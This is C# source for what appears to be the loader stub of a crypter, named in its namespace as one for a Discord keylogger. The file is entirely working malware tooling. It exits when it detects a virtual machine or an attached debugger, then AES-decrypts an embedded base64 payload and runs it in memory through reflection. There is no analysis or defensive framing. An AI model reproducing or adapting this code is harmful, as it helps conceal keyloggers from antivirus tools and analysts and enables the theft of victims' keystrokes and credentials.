using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace THT_Discord_Keylogger_Crypter
{
    class Program
    {
        public static void check_wm()
        {
            using (var searcher = new System.Management.ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
            {
                using (var items = searcher.Get())
                {
                    foreach (var item in items)
                    {
                        string manufacturer = item["Manufacturer"].ToString().ToLower();
                        if ((manufacturer == "microsoft corporation" && item["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL"))
                            || manufacturer.Contains("vmware")
                            || item["Model"].ToString() == "VirtualBox")
                        {
                            Environment.Exit(0);
                        }
                    }
                }
            }
        }
        public static void run_check_debugger_thread()
        {
            Thread t = new Thread(new ThreadStart(() => {
                while (!Debugger.IsAttached)
                {
                    Thread.Sleep(100);
                }
                Environment.Exit(0);
            }));
            t.Start();
        }

        static byte[] decrypt_stub(string key, string iv, string stub_b64)
        {
            byte[] stub = Convert.FromBase64String(stub_b64);
            RijndaelManaged rijndael = new RijndaelManaged();
            Rfc2898DeriveBytes key_generator = new Rfc2898DeriveBytes(key, Encoding.UTF8.GetBytes(iv));
            ICryptoTransform crypto_transform = rijndael.CreateDecryptor(key_generator.GetBytes(32), key_generator.GetBytes(16));

            return crypto_transform.TransformFinalBlock(stub, 0, stub.Length);
        }

        public static string ReadResource(string name)
        {
            // Determine path
            var assembly = Assembly.GetExecutingAssembly();

            using (Stream stream = assembly.GetManifestResourceStream(name))
            using (StreamReader reader = new StreamReader(stream))
            {
                return reader.ReadToEnd();
            }
        }

        static void Main(string[] args)
        {
            if (ReadResource("vm") == "true")
            {
                check_wm();
            }

            if (ReadResource("dbg") == "true")
            {
                run_check_debugger_thread();
            }

            byte[] decrypted_stub = decrypt_stub(
                    ReadResource("key"),
                    ReadResource("iv"),
                    ReadResource("stub")
                    );

            Assembly a = Assembly.Load(decrypted_stub);
            MethodInfo m = a.EntryPoint;
            var parameters = m.GetParameters().Length == 0 ? null : new[] { new string[0] };
            m.Invoke(null, parameters);
        }
    }
}
